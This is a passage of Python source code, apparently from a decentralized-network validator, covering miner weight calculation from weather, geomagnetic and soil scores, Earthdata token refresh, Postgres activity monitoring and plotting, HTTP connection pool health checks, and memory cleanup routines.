                    # Additional debug for empty weather results
                    debug_weather_query = "SELECT COUNT(*), MIN(created_at), MAX(created_at), array_agg(DISTINCT task_id) as task_ids FROM score_table WHERE task_name = 'weather'"
                    try:
                        debug_result = await self.database_manager.fetch_one(debug_weather_query)
                        logger.info(f"Debug weather check: {debug_result}")
                    except Exception as debug_e:
                        logger.error(f"Debug weather query failed: {debug_e}")
                        
                if geomagnetic_results and not isinstance(geomagnetic_results, Exception):
                    logger.info(f"Geomagnetic dataset: {len(geomagnetic_results)} records")
                if soil_results and not isinstance(soil_results, Exception):
                    logger.info(f"Soil dataset: {len(soil_results)} records")
                    # Check soil record size (they contain large score arrays)
                    if soil_results:
                        sample_soil = soil_results[0]
                        if 'score' in sample_soil and isinstance(sample_soil['score'], list):
                            logger.info(f"Soil score array size per record: {len(sample_soil['score'])} elements")
                if validator_nodes_list and not isinstance(validator_nodes_list, Exception):
                    logger.info(f"Validator nodes dataset: {len(validator_nodes_list)} records")
                
                # Check for exceptions in results
                for i, result in enumerate([weather_results, geomagnetic_results, soil_results, validator_nodes_list]):
                    if isinstance(result, Exception):
                        task_names = ['weather', 'geomagnetic', 'soil', 'validator_nodes']
                        logger.error(f"Error fetching {task_names[i]} data: {result}")
                        return None
                
                # Log memory after database queries
                self._log_memory_usage("calc_weights_after_db_queries")

                # Defensive fallbacks for failed queries
                if not weather_results:
                    weather_results = []
                if not geomagnetic_results:
                    geomagnetic_results = []
                if not soil_results:
                    soil_results = []
                if not validator_nodes_list:
                    logger.error("Failed to fetch validator nodes - cannot calculate weights")
                    return None

                logger.info(f"Fetched scores: Weather={len(weather_results)}, Geo={len(geomagnetic_results)}, Soil={len(soil_results)}")
                
                # Convert to list for the sync calculation
                self._log_memory_usage("calc_weights_before_node_conversion")
                validator_nodes_by_uid_list = [None] * 256
                for node_dict in validator_nodes_list:
                    uid = node_dict.get('uid')
                    if uid is not None and 0 <= uid < 256:
                        validator_nodes_by_uid_list[uid] = node_dict
                self._log_memory_usage("calc_weights_after_node_conversion")

                # IMMEDIATELY clear the original large list to save memory
                del validator_nodes_list
                
                # MEMORY LEAK FIX: Force immediate cleanup of database query results before sync calculation
                # The database results can be very large (200 soil records × 256 scores = 51,200 values)
                try:
                    import gc
                    # Calculate total memory footprint before cleanup
                    total_records = len(weather_results) + len(geomagnetic_results) + len(soil_results)
                    logger.info(f"Processing {total_records} total database records for weight calculation")
                    
                    # Trigger performance statistics calculation after gathering all task scores
                    # This ensures performance stats are updated when new scores are available
                    try:
                        logger.info("🔄 Triggering performance statistics calculation after score gathering...")
                        await self._calculate_performance_statistics(force_calculation=False)
                    except Exception as perf_err:
                        logger.error(f"Error calculating performance statistics: {perf_err}")
                    
                    # Force garbage collection before the heavy sync calculation
                    collected = gc.collect()
                    logger.debug(f"Pre-sync GC: collected {collected} objects before weight calculation")
                    
                    self._log_memory_usage("calc_weights_pre_sync_gc")
                except Exception as pre_sync_cleanup_err:
                    logger.debug(f"Error during pre-sync cleanup: {pre_sync_cleanup_err}")

                # Perform CPU-bound weight calculation in thread pool to avoid blocking
                self._log_memory_usage("calc_weights_before_sync_calc")
                loop = asyncio.get_event_loop()
                weight_result = await loop.run_in_executor(
                    None,
                    self._perform_weight_calculations_sync,
                    weather_results,
                    geomagnetic_results,
                    soil_results,
                    now,
                    validator_nodes_by_uid_list
                )
                self._log_memory_usage("calc_weights_after_sync_calc")
                
                # === NEW: Handle enhanced return structure with pathway tracking ===
                if isinstance(weight_result, tuple) and len(weight_result) == 2:
                    final_weights_list, pathway_tracking = weight_result
                    logger.info(f"Captured pathway tracking data for {len(pathway_tracking)} miners")
                    
                    # Store pathway tracking in performance calculator for later integration
                    if self.performance_calculator and pathway_tracking:
                        # Store current pathway tracking data in the calculator
                        if not hasattr(self.performance_calculator, '_current_pathway_data'):
                            self.performance_calculator._current_pathway_data = {}
                        self.performance_calculator._current_pathway_data.update(pathway_tracking)
                        logger.debug("Pathway tracking data stored in performance calculator")
                else:
                    # Fallback for old return format or error cases
                    final_weights_list = weight_result
                    logger.warning("Weight calculation returned old format or failed - no pathway tracking available")

                # MEMORY CLEANUP after sync calculation (scope-aware)
                try:
                    # Clear all large data structures that exist in this scope
                    del weather_results
                    del geomagnetic_results  
                    del soil_results
                    del validator_nodes_by_uid_list
                    
                    # Force immediate garbage collection
                    import gc
                    collected = gc.collect()
                    logger.info(f"Weight calculation cleanup: collected {collected} objects after data deletion")
                    
                    # Force comprehensive cleanup for weight calculation (if fully initialized)
                    if hasattr(self, 'last_metagraph_sync'):
                        memory_freed = self._comprehensive_memory_cleanup("weight_calculation")
                        logger.info(f"Weight calculation comprehensive cleanup: freed {memory_freed:.1f}MB")
                    else:
                        # Additional GC during startup
                        for _ in range(2):  # Multiple GC passes
                            collected += gc.collect()
                        logger.info(f"Basic GC cleanup during startup: collected {collected} objects")
                        memory_freed = 0
                    
                    # Log memory after cleanup
                    self._log_memory_usage("calc_weights_after_cleanup")
                    
                except Exception as cleanup_err:
                    logger.warning(f"Error during weight calculation cleanup: {cleanup_err}")

                return final_weights_list

            except Exception as query_error:
                logger.error(f"Error during database queries for weight calculation: {query_error}")
                return None

        except Exception as e:
            logger.error(f"Error calculating task weights: {e}")
            logger.error(traceback.format_exc())
            return None

    async def update_last_weights_block(self):
        try:
            resp = self.substrate.rpc_request("chain_getHeader", [])  
            hex_num = resp["result"]["number"]
            block_number = int(hex_num, 16)
            self.last_set_weights_block = block_number
        except Exception as e:
            logger.error(f"Error updating last weights block: {e}")

    async def manage_earthdata_token(self):
        """Periodically checks and refreshes the Earthdata token."""
        logger.info("🌍 Earthdata token management task started - running initial check immediately...")
        
        while not self._shutdown_event.is_set():
            try:
                logger.info("🔍 Running Earthdata token check...")
                token = await ensure_valid_earthdata_token()
                if token:
                    logger.info(f"✅ Earthdata token check successful. Current token (first 10 chars): {token[:10]}...")
                else:
                    logger.warning("⚠️ Earthdata token check failed or no token available.")

                logger.info("⏰ Earthdata token check complete. Sleeping for 24 hours until next check...")
                await asyncio.sleep(86400) # Check daily

            except asyncio.CancelledError:
                logger.info("🛑 Earthdata token management task cancelled.")
                break
            except Exception as e:
                logger.error(f"❌ Error in Earthdata token management task: {e}", exc_info=True)
                logger.info("🔄 Retrying Earthdata token check in 1 hour due to error...")
                await asyncio.sleep(3600) # Retry in an hour if there was an error

    async def _initialize_db_sync_components(self):
        logger.info("Attempting to initialize DB Sync components...")
        
        db_sync_enabled_str = os.getenv("DB_SYNC_ENABLED", "True") # Default to True if not set
        if db_sync_enabled_str.lower() != "true":
            logger.info("DB_SYNC_ENABLED is not 'true'. Database synchronization feature will be disabled.")
            self.auto_sync_manager = None
            return

        # Initialize AutoSyncManager (streamlined sync system using pgBackRest + R2)
        try:
            logger.info("Initializing AutoSyncManager (streamlined sync system)...")
            self.auto_sync_manager = await get_auto_sync_manager(test_mode=self.args.test)
            if self.auto_sync_manager:
                logger.info("✅ AutoSyncManager initialized successfully")
                logger.info("🔧 AutoSyncManager provides automated setup and application-controlled scheduling")
                logger.info("📝 To set up database sync, run: python gaia/validator/sync/setup_auto_sync.py --primary (or --replica)")
                return
            else:
                logger.warning("AutoSyncManager failed to initialize - check environment variables")
        except Exception as e:
            logger.warning(f"AutoSyncManager initialization failed: {e}")
            logger.info("💡 To enable DB sync, configure PGBACKREST_R2_* environment variables")
            logger.info("   - PGBACKREST_R2_BUCKET")
            logger.info("   - PGBACKREST_R2_ENDPOINT") 
            logger.info("   - PGBACKREST_R2_ACCESS_KEY_ID")
            logger.info("   - PGBACKREST_R2_SECRET_ACCESS_KEY")
        
        logger.info("DB Sync initialization completed (not active).")

    async def _calculate_performance_statistics(self, force_calculation: bool = False):
        """Calculate and store miner performance statistics periodically."""
        try:
            # Only calculate if performance calculator is initialized and enough time has passed
            if not self.performance_calculator:
                logger.debug("Performance calculator not initialized, skipping statistics calculation")
                return
            
            current_time = time.time()
            # Calculate daily stats once every 30 minutes (1800 seconds) - more frequent for better responsiveness
            if not force_calculation and current_time - self.last_performance_calculation < 1800:
                logger.debug(f"Skipping performance calculation - only {current_time - self.last_performance_calculation:.0f}s since last calculation")
                return
            
            logger.info("🔄 Calculating miner performance statistics...")
            
            # Calculate daily statistics for today
            today = datetime.now(timezone.utc).replace(hour=0, minute=0, second=0, microsecond=0)
            
            # Use daily stats calculation function with database manager
            daily_performances = await calculate_daily_stats(self.database_manager, today)
            
            if daily_performances:
                logger.info(f"✅ Calculated performance stats for {len(daily_performances)} miners")
                
                # Log summary of top performers
                top_performers = [p for p in daily_performances if p.overall_avg_score is not None][:5]
                if top_performers:
                    logger.info("🏆 Top performers today:")
                    for i, perf in enumerate(top_performers):
                        logger.info(f"  {i+1}. {perf.miner_hotkey[:12]}... - Score: {perf.overall_avg_score:.3f}, Tasks: {perf.total_attempted}")
            else:
                logger.info("No miner performance data available for today")
            
            # Clean up performance data for deregistered miners
            try:
                cleaned_count = await self.performance_calculator.cleanup_deregistered_miners()
                if cleaned_count > 0:
                    logger.info(f"🧹 Cleaned up performance data for {cleaned_count} deregistered miners")
            except Exception as cleanup_err:
                logger.error(f"Error during deregistered miner cleanup: {cleanup_err}")
            
            # Update last calculation time
            self.last_performance_calculation = current_time
            
        except Exception as e:
            logger.error(f"Error calculating performance statistics: {e}")
            logger.error(traceback.format_exc())
    
    async def _integrate_chain_consensus_data(self, chain_nodes_info: Dict[int, Any]):
        """
        Integrate chain consensus data (incentive values, block info) into performance statistics.
        This method captures the final chain consensus results and stores them for analysis.
        """
        try:
            if not self.performance_calculator:
                logger.debug("Performance calculator not available for chain integration")
                return
            
            # Get current block information using the existing cached method
            current_block = None
            try:
                current_block = self._get_current_block_cached()
            except Exception as block_err:
                logger.debug(f"Could not get current block number: {block_err}")
                # Fallback to current_block attribute if cache method fails
                if hasattr(self, 'current_block'):
                    current_block = self.current_block
            
            # Prepare consensus data for miners with incentive values
            consensus_updates = {}
            valid_miners = 0
            
            for uid, chain_node in chain_nodes_info.items():
                try:
                    if (hasattr(chain_node, 'incentive') and 
                        chain_node.incentive is not None and 
                        float(chain_node.incentive) > 0):
                        
                        consensus_updates[uid] = {
                            'incentive': float(chain_node.incentive),
                            'consensus_block': current_block,
                            'validator_hotkey': self.validator_hotkey if hasattr(self, 'validator_hotkey') else None
                        }
                        valid_miners += 1
                        
                except Exception as miner_err:
                    logger.debug(f"Error processing consensus data for UID {uid}: {miner_err}")
                    continue
            
            if consensus_updates:
                # Store consensus data in performance calculator for integration
                if not hasattr(self.performance_calculator, '_current_consensus_data'):
                    self.performance_calculator._current_consensus_data = {}
                self.performance_calculator._current_consensus_data.update(consensus_updates)
                
                logger.info(f"📊 Captured chain consensus data for {valid_miners} miners (block: {current_block})")
                
                # Calculate consensus ranks based on incentive values
                incentive_values = [(uid, data['incentive']) for uid, data in consensus_updates.items()]
                incentive_values.sort(key=lambda x: x[1], reverse=True)  # Sort by incentive descending
                
                # Add consensus ranks
                for rank, (uid, incentive) in enumerate(incentive_values, 1):
                    consensus_updates[uid]['consensus_rank'] = rank
                
                logger.debug(f"Chain consensus integration: Top 5 miners by incentive: "
                           f"{[(uid, f'{inc:.4f}') for uid, inc in incentive_values[:5]]}")
            else:
                logger.debug("No miners with valid incentive values found for consensus integration")
                
        except Exception as e:
            logger.warning(f"Error during chain consensus integration: {e}")
            # Don't let this break the main loop

    async def database_monitor(self):
        """Periodically query and log database statistics from a consistent snapshot."""
        logger.info("Starting database monitor task...")
        while not self._shutdown_event.is_set():
            await asyncio.sleep(60) # Check every 60 seconds

            current_timestamp_iso = datetime.now(timezone.utc).isoformat()
            collected_stats = {
                "timestamp": current_timestamp_iso,
                "connection_summary": "[Query Failed or No Data]",
                "null_state_connection_details": [],
                "idle_in_transaction_details": [],
                "lock_details": "[Query Failed or No Data]",
                "active_query_wait_events": [],
                "session_manager_stats": "[Query Failed or No Data]",
                "error": None
            }

            try:
                # 1. Fetch all pg_stat_activity data at once for a consistent snapshot
                activity_snapshot = []
                activity_query = "SELECT pid, usename, application_name, client_addr, backend_start, state, backend_type, query, state_change, query_start, wait_event_type, wait_event FROM pg_stat_activity;"
                try:
                    activity_snapshot = await self.database_manager.fetch_all(activity_query, timeout=45.0)
                except DatabaseTimeout:
                    collected_stats["error"] = "Timeout fetching pg_stat_activity snapshot."
                    logger.warning(f"[DB Monitor] {collected_stats['error']}")
                except Exception as e:
                    collected_stats["error"] = f"Error fetching pg_stat_activity snapshot: {type(e).__name__}"
                    logger.warning(f"[DB Monitor] {collected_stats['error']} - {e}")

                if collected_stats["error"]:
                    await self._log_and_store_db_stats(collected_stats)
                    continue

                # 2. Process the snapshot in memory
                summary, null_state_details, idle_in_transaction_details, active_query_details = self._process_activity_snapshot(activity_snapshot)
                
                collected_stats["connection_summary"] = summary
                collected_stats["null_state_connection_details"] = null_state_details
                collected_stats["idle_in_transaction_details"] = idle_in_transaction_details
                collected_stats["active_query_wait_events"] = active_query_details

                # 3. Fetch other stats
                try:
                    collected_stats["session_manager_stats"] = self.database_manager.get_session_stats()
                except Exception as e:
                    collected_stats["session_manager_stats"] = f"[Error fetching session manager stats: {type(e).__name__}]"

                lock_details_query = """
                SELECT
                    activity.pid,
                    activity.usename,
                    activity.query,
                    blocking_locks.locktype AS blocking_locktype,
                    blocking_activity.query AS blocking_query,
                    blocking_activity.pid AS blocking_pid,
                    blocking_activity.usename AS blocking_usename,
                    age(now(), activity.query_start) as query_age
                FROM pg_stat_activity AS activity
                JOIN pg_locks AS blocking_locks ON blocking_locks.pid = activity.pid AND NOT blocking_locks.granted
                JOIN pg_locks AS granted_locks ON granted_locks.locktype = blocking_locks.locktype AND granted_locks.pid != activity.pid AND granted_locks.granted
                JOIN pg_stat_activity AS blocking_activity ON blocking_activity.pid = granted_locks.pid
                WHERE activity.wait_event_type = 'Lock';
                """
                try:
                    collected_stats["lock_details"] = await self.database_manager.fetch_all(lock_details_query, timeout=45.0)
                except DatabaseTimeout:
                    collected_stats["lock_details"] = "[Query Timed Out]"
                except Exception as e:
                    collected_stats["lock_details"] = f"[Query Error: {type(e).__name__}]"

            except Exception as e_outer:
                collected_stats["error"] = f"Outer error in database_monitor: {str(e_outer)}"
                logger.error(f"[DB Monitor] Outer error: {e_outer}", exc_info=True)

            await self._log_and_store_db_stats(collected_stats)
            gc.collect()

    def _process_activity_snapshot(self, activity_snapshot):
        summary = {}
        null_state_details = []
        idle_in_transaction_details = []
        active_query_details = []
        
        # Note: To perfectly exclude the monitor's own query, another query for its pid would be needed.
        # This implementation omits that for simplicity, so the monitor's query may appear in active queries.
        
        for row_proxy in activity_snapshot:
            row = dict(row_proxy)
            state = row.get('state')
            summary[state] = summary.get(state, 0) + 1

            if state is None:
                null_state_details.append(row)
            elif state == 'idle in transaction':
                idle_in_transaction_details.append(row)
            elif state == 'active' and row.get('backend_type') == 'client backend':
                if row.get('query_start'):
                    row['query_age'] = datetime.now(timezone.utc) - row.get('query_start')
                else:
                    row['query_age'] = timedelta(0)
                active_query_details.append(row)

        idle_in_transaction_details.sort(key=lambda r: r.get('state_change') or datetime.min.replace(tzinfo=timezone.utc))
        active_query_details.sort(key=lambda r: r.get('query_start') or datetime.min.replace(tzinfo=timezone.utc), reverse=True)
        
        summary_list = [{"state": s if s is not None else "null", "count": c} for s, c in summary.items()]
        
        return summary_list, null_state_details, idle_in_transaction_details, active_query_details

    async def _log_and_store_db_stats(self, collected_stats: dict):
        """Helper to store stats in history and log them."""
        async with self.db_monitor_history_lock:
            self.db_monitor_history.append(collected_stats)
            if len(self.db_monitor_history) > self.DB_MONITOR_HISTORY_MAX_SIZE:
                self.db_monitor_history.pop(0)

        log_output = "[DB Monitor] Stats:\n"
        for key, value in collected_stats.items():
            if key == "error" and value is None:
                continue
            try:
                title = key.replace('_', ' ').title()
                if isinstance(value, list):
                    log_output += f"  {title}:\n"
                    if not value:
                        log_output += "  []\n"
                    else:
                        # Show up to 5 entries before truncating for brevity
                        for i, item in enumerate(value[:5]):
                            item_dict = dict(item)
                            log_output += "  {\n"
                            for k, v in item_dict.items():
                                v_str = str(v)
                                if isinstance(v, datetime):
                                    v_str = v.isoformat()
                                elif isinstance(v, timedelta):
                                    v_str = str(v)
                                log_output += f"    {k}: {v_str}\n"
                            log_output += "  }\n"
                        if len(value) > 5:
                            log_output += f"  ... and {len(value) - 5} more ...\n"
                else:
                    # Use high-performance JSON for database monitoring
                    try:
                        from gaia.utils.performance import dumps
                        log_output += f"  {title}: {dumps(value, default=str)}\n"
                    except ImportError:
                        import json
                        log_output += f"  {title}: {json.dumps(value, indent=2, default=str)}\n"
            except Exception as e_log:
                log_output += f"  Error formatting log for {key}: {e_log}\n"
        
        logger.info(log_output)

    def _generate_and_save_plot_sync(self, history_copy):
        """Synchronous helper to generate and save database metrics plots."""
        try:
            import matplotlib
            matplotlib.use('Agg') # Use Agg backend for non-interactive plotting
            import matplotlib.pyplot as plt
            import matplotlib.dates as mdates
        except ImportError as e:
            logger.error(f"Matplotlib import error in sync plot generation: {e}. Plotting will be disabled for this cycle.")
            return

        if not history_copy or len(history_copy) < 2:
            logger.info("Not enough data in history_copy for sync plot generation. Skipping.")
            return

        timestamps = []
        avg_session_times = []
        min_session_times = []
        max_session_times = []
        total_connections_list = []

        for record in history_copy:
            try:
                ts = datetime.fromisoformat(record.get("timestamp"))
                timestamps.append(ts)

                session_stats = record.get("session_manager_stats", {})
                if isinstance(session_stats, dict):
                    avg_session_times.append(session_stats.get("avg_session_time_ms", float('nan')))
                    min_session_times.append(session_stats.get("min_session_time_ms", float('nan')))
                    max_session_times.append(session_stats.get("max_session_time_ms", float('nan')))
                else:
                    avg_session_times.append(float('nan'))
                    min_session_times.append(float('nan'))
                    max_session_times.append(float('nan'))

                connection_summary = record.get("connection_summary", [])
                current_total_connections = 0
                if isinstance(connection_summary, list):
                    for conn_info in connection_summary:
                        if isinstance(conn_info, dict) and "count" in conn_info and isinstance(conn_info["count"], (int, float)):
                            current_total_connections += conn_info["count"]
                total_connections_list.append(current_total_connections)
            except Exception as e:
                logger.warning(f"Skipping record in sync plot generation due to parsing error: {e} - Record: {record}")
                continue
        
        if not timestamps or len(timestamps) < 2:
            logger.info("Not enough valid data points for sync plot generation after parsing. Skipping.")
            return

        fig, axs = plt.subplots(2, 1, figsize=(15, 12), sharex=True)
        fig.suptitle('Database Performance Monitor', fontsize=16)

        axs[0].plot(timestamps, avg_session_times, label='Avg Session Time (ms)', marker='.', linestyle='-', color='blue')
        axs[0].plot(timestamps, min_session_times, label='Min Session Time (ms)', marker='.', linestyle=':', color='green')
        axs[0].plot(timestamps, max_session_times, label='Max Session Time (ms)', marker='.', linestyle=':', color='red')
        axs[0].set_ylabel('Session Time (ms)')
        axs[0].set_title('DB Session Durations')
        axs[0].legend()
        axs[0].grid(True)

        ax2 = axs[1]
        ax2.plot(timestamps, total_connections_list, label='Total Connections', marker='.', linestyle='-', color='purple')
        ax2.set_ylabel('Number of Connections')
        ax2.set_title('DB Connection Count')
        ax2.legend()
        ax2.grid(True)

        fig.autofmt_xdate()
        xfmt = mdates.DateFormatter('%Y-%m-%d\n%H:%M:%S')
        for ax_item in axs:
            ax_item.xaxis.set_major_formatter(xfmt)
        
        plt.tight_layout(rect=[0, 0, 1, 0.96])
        plot_filename = "database_performance_plot.png"
        try:
            plt.savefig(plot_filename)
            logger.info(f"Database performance plot saved to {plot_filename}")
        except Exception as e_save:
            logger.error(f"Error saving plot to {plot_filename}: {e_save}")
        finally:
            plt.close(fig)
            # Explicitly trigger garbage collection after plotting if memory is a concern
            # However, plt.close(fig) should handle most of it.
            import gc
            gc.collect()

    async def plot_database_metrics_periodically(self):
        """Periodically generates and saves database metrics plots."""
        # Matplotlib imports are now inside _generate_and_save_plot_sync
        # to ensure they are only imported in the executor thread if needed.

        while not self._shutdown_event.is_set():
            await asyncio.sleep(20 * 60) # Plot every 20 minutes
            logger.info("Requesting database performance plot generation...")
            history_copy_for_plot = []
            async with self.db_monitor_history_lock:
                if not self.db_monitor_history or len(self.db_monitor_history) < 2:
                    logger.info("Not enough data in db_monitor_history to generate plots. Skipping this cycle.")
                    continue
                history_copy_for_plot = list(self.db_monitor_history) 
            
            if not history_copy_for_plot:
                 logger.info("History copy for plotting is empty, skipping plot generation.") # Should be caught by above check too
                 continue

            try:
                # Offload the plotting to the synchronous helper method in an executor thread
                await asyncio.to_thread(self._generate_and_save_plot_sync, history_copy_for_plot)
            except Exception as e:
                logger.error(f"Error occurred when calling plot generation in executor: {e}")
                logger.error(traceback.format_exc())
            # No finally gc.collect() here, it's in the sync method

    def get_current_task_weights(self) -> Dict[str, float]:
        now_utc = datetime.now(timezone.utc)
        
        # Default to the first set of weights in the schedule if current time is before any scheduled change
        # or if the schedule is somehow empty (though it's hardcoded not to be).
        active_weights = self.task_weight_schedule[0][1] 
        
        # Iterate through the schedule to find the latest applicable weights
        # The schedule is assumed to be sorted by datetime.
        for dt_threshold, weights_at_threshold in self.task_weight_schedule:
            if now_utc >= dt_threshold:
                active_weights = weights_at_threshold
            else:
                # Since the list is sorted, once we pass a threshold that's in the future,
                # the previously set active_weights are correct for the current time.
                break 
                
        # logger.debug(f"Using task weights for current time {now_utc.isoformat()}: {active_weights}")
        return active_weights.copy() # Return a copy to prevent modification of the schedule

    async def monitor_client_health(self):
        """Monitor HTTP client connection pool health."""
        while not self._shutdown_event.is_set():
            try:
                if hasattr(self, 'miner_client') and hasattr(self.miner_client, '_transport'):
                    transport = self.miner_client._transport
                    if hasattr(transport, '_pool'):
                        pool = transport._pool
                        if hasattr(pool, '_connections'):
                            connections = pool._connections
                            total_connections = len(connections)
                            
                            # Count different connection states
                            keepalive_connections = 0
                            idle_connections = 0
                            active_connections = 0
                            unique_hosts = set()
                            
                            # Handle both list and dict cases for _connections
                            if hasattr(connections, 'values'):  # It's a dict-like object
                                connection_items = connections.values()
                            else:  # It's a list-like object
                                connection_items = connections
                            
                            for conn in connection_items:
                                # Count keepalive connections
                                if hasattr(conn, '_keepalive_expiry') and conn._keepalive_expiry:
                                    keepalive_connections += 1
                                
                                # Count idle connections
                                if hasattr(conn, 'is_idle') and callable(conn.is_idle):
                                    try:
                                        if conn.is_idle():
                                            idle_connections += 1
                                        else:
                                            active_connections += 1
                                    except Exception:
                                        pass
                                
                                # Track unique hosts
                                if hasattr(conn, '_origin') and conn._origin:
                                    unique_hosts.add(str(conn._origin))
                                elif hasattr(conn, '_socket') and hasattr(conn._socket, 'getpeername'):
                                    try:
                                        peer = conn._socket.getpeername()
                                        unique_hosts.add(f"{peer[0]}:{peer[1]}")
                                    except Exception:
                                        pass
                            
                            # Get pool limit - check multiple possible locations
                            pool_limit = "unknown"
                            keepalive_limit = "unknown"
                            if hasattr(self.miner_client, '_limits'):
                                if hasattr(self.miner_client._limits, 'max_connections'):
                                    pool_limit = self.miner_client._limits.max_connections
                                if hasattr(self.miner_client._limits, 'max_keepalive_connections'):
                                    keepalive_limit = self.miner_client._limits.max_keepalive_connections
                            
                            # Log detailed information - use INFO level when high connection counts detected
                            log_level = logger.info if total_connections > 75 else logger.debug
                            log_level(f"HTTP Client Pool Health - "
                                    f"Total: {total_connections}/{pool_limit}, "
                                    f"Keepalive: {keepalive_connections}/{keepalive_limit}, "
                                    f"Idle: {idle_connections}, Active: {active_connections}, "
                                    f"Unique hosts: {len(unique_hosts)}")
                            
                            # If we have excessive connections, log the unique hosts
                            if total_connections > 80 and unique_hosts:
                                logger.info(f"Connection pool has {total_connections} connections to {len(unique_hosts)} unique hosts")
                                if len(unique_hosts) <= 15:  # Only log if manageable number
                                    logger.debug(f"Connected hosts: {list(unique_hosts)[:15]}")
                            
                            # Only trigger cleanup if we have excessive idle connections (not just any idle)
                            if idle_connections > 30:
                                logger.info(f"High idle connection count ({idle_connections}), triggering cleanup")
                                try:
                                    await self._cleanup_idle_connections()
                                except Exception as e:
                                    logger.warning(f"Error during automatic connection cleanup: {e}")
                            
                await asyncio.sleep(300)  # Check every 5 minutes
            except Exception as e:
                logger.debug(f"Error monitoring client health: {e}")
                await asyncio.sleep(300)

    async def memory_snapshot_taker(self):
        """Periodically takes memory snapshots and logs differences."""
        # Register this task for global memory cleanup coordination
        try:
            from gaia.utils.global_memory_manager import register_thread_cleanup
            
            def cleanup_snapshot_caches():
                # Clear any caches that accumulate during memory snapshot processing
                import gc
                collected = gc.collect()
                logger.debug(f"[MemorySnapshotTaker] Performed cleanup, collected {collected} objects")
            
            register_thread_cleanup("memory_snapshot_taker", cleanup_snapshot_caches)
            logger.debug("[MemorySnapshotTaker] Registered for global memory cleanup")
        except Exception as e:
            logger.debug(f"[MemorySnapshotTaker] Failed to register cleanup: {e}")
        
        logger.info("Starting memory snapshot taker task...")
        
        snapshot_interval_seconds = 300 # 5 minutes
        logger.info(f"Memory snapshots will be taken every {snapshot_interval_seconds} seconds.")

        while not self._shutdown_event.is_set():
            try:
                await asyncio.sleep(snapshot_interval_seconds)
                if self._shutdown_event.is_set():
                    break

                logger.info("--- Taking Tracemalloc Snapshot ---")
                current_snapshot = tracemalloc.take_snapshot()
                
                logger.info("Top 10 current memory allocations (by line number):")
                for stat in current_snapshot.statistics('lineno')[:10]:
                    logger.info(f"  {stat}")
                    # Uncomment for full traceback of top allocations if needed
                    # logger.info(f"    Traceback for allocation at {stat.traceback[0]}:")
                    # for line in stat.traceback.format():
                    #    logger.info(f"      {line}")

                if self.tracemalloc_snapshot1:
                    logger.info("Comparing to previous snapshot...")
                    top_stats = current_snapshot.compare_to(self.tracemalloc_snapshot1, 'lineno')
                    logger.info("Top 10 memory differences since last snapshot:")
                    for stat in top_stats[:10]:
                        logger.info(f"  {stat}")
                        # Uncomment for full traceback of significant differences
                        # logger.info(f"    Traceback for diff at {stat.traceback[0]}:")
                        # for line in stat.traceback.format():
                        #    logger.info(f"      {line}")
                
                self.tracemalloc_snapshot1 = current_snapshot
                logger.info("--- Tracemalloc Snapshot Processed ---")

            except asyncio.CancelledError:
                logger.info("Memory snapshot taker task cancelled.")
                break
            except Exception as e:
                logger.error(f"Error in memory_snapshot_taker: {e}", exc_info=True)
                await asyncio.sleep(60) # Wait a bit before retrying if an error occurs

    async def periodic_substrate_cleanup(self):
        """Placeholder - substrate cleanup no longer needed with isolated substrate interface."""
        logger.info("🛡️  Periodic substrate cleanup is disabled - using isolated substrate interface for memory leak prevention")
        
        # Keep this method running to maintain task compatibility, but it does nothing
        # Process isolation prevents ABC object accumulation completely
        while True:
            await asyncio.sleep(3600)  # Sleep for 1 hour and do nothing meaningful
            logger.debug("🛡️  Isolated substrate interface prevents memory leaks - no cleanup needed")

    async def aggressive_memory_cleanup(self):
        """Regular memory cleanup to maintain equilibrium and prevent unbounded growth."""
        while True:
            try:
                await asyncio.sleep(60)  # Run every 1 minute for better equilibrium
                
                # Get memory before cleanup
                if PSUTIL_AVAILABLE:
                    process = psutil.Process()
                    memory_before = process.memory_info().rss / (1024 * 1024)
                    
                    # PERFORMANCE-FIRST: Only clear caches when memory pressure requires it
                    cleanup_level = "none"
                    if memory_before > 25000:  # > 25GB (78% of 32GB) - Emergency cleanup
                        cleanup_level = "aggressive"
                    elif memory_before > 22000:  # > 22GB (69% of 32GB) - Moderate cleanup  
                        cleanup_level = "moderate"
                    elif memory_before > 18000:  # > 18GB (56% of 32GB) - Light cleanup
                        cleanup_level = "light"
                    # Below 18GB: NO cache clearing - preserve performance for optimal operation
                        
                    # Only perform cleanup when memory pressure actually requires it
                    collected = 0
                    comp_memory_freed = 0
                    
                    if cleanup_level == "aggressive":
                        logger.warning(f"HIGH MEMORY PRESSURE: {memory_before:.1f}MB - performing aggressive cleanup")
                        
                        # Force comprehensive cleanup first
                        if hasattr(self, 'last_metagraph_sync'):
                            comp_memory_freed = self._comprehensive_memory_cleanup("pressure_aggressive")
                        
                        # Clean up HTTP connections more aggressively
                        try:
                            if hasattr(self, 'miner_client') and self.miner_client and not self.miner_client.is_closed:
                                await self._cleanup_idle_connections()
                        except Exception:
                            pass
                            
                        # Force multiple GC passes
                        import gc
                        for _ in range(3):
                            collected += gc.collect()
                            
                        # Clean up background tasks that may be accumulating
                        try:
                            task_count = len(self._background_tasks)
                            if task_count > 50:  # Too many background tasks
                                logger.warning(f"High background task count: {task_count} - cleaning up completed tasks")
                                completed_tasks = [t for t in self._background_tasks if t.done()]
                                for task in completed_tasks:
                                    self._background_tasks.discard(task)
                                logger.info(f"Removed {len(completed_tasks)} completed background tasks")
                        except Exception:
                            pass
                            
                    elif cleanup_level == "moderate":
                        logger.info(f"MODERATE MEMORY PRESSURE: {memory_before:.1f}MB - performing moderate cleanup")
                        
                        # Standard comprehensive cleanup
                        if hasattr(self, 'last_metagraph_sync'):
                            comp_memory_freed = self._comprehensive_memory_cleanup("pressure_moderate")
                        
                        # Standard GC
                        import gc
                        collected = gc.collect()
                        
                    elif cleanup_level == "light":
                        logger.info(f"LIGHT MEMORY PRESSURE: {memory_before:.1f}MB - performing minimal cleanup")
                        
                        # Light cache clearing - preserve most performance caches
                        if hasattr(self, 'last_metagraph_sync'):
                            comp_memory_freed = self._comprehensive_memory_cleanup("pressure_light")
                        
                        # Standard GC
                        import gc
                        collected = gc.collect()
                        
                    elif cleanup_level == "none":
                        # NO CACHE CLEARING - optimal performance mode
                        logger.debug(f"PERFORMANCE MODE: {memory_before:.1f}MB - no cache clearing needed")
                        
                        # Only minimal maintenance: basic GC and connection cleanup
                        import gc
                        collected = gc.collect()
                        
                        # Basic connection maintenance
                        try:
                            if hasattr(self, 'miner_client') and self.miner_client and not self.miner_client.is_closed:
                                await self._cleanup_idle_connections()
                        except Exception:
                            pass
                    
                    # Trigger coordinated cleanup across all background threads (all cleanup levels)
                    if cleanup_level != "none":
                        try:
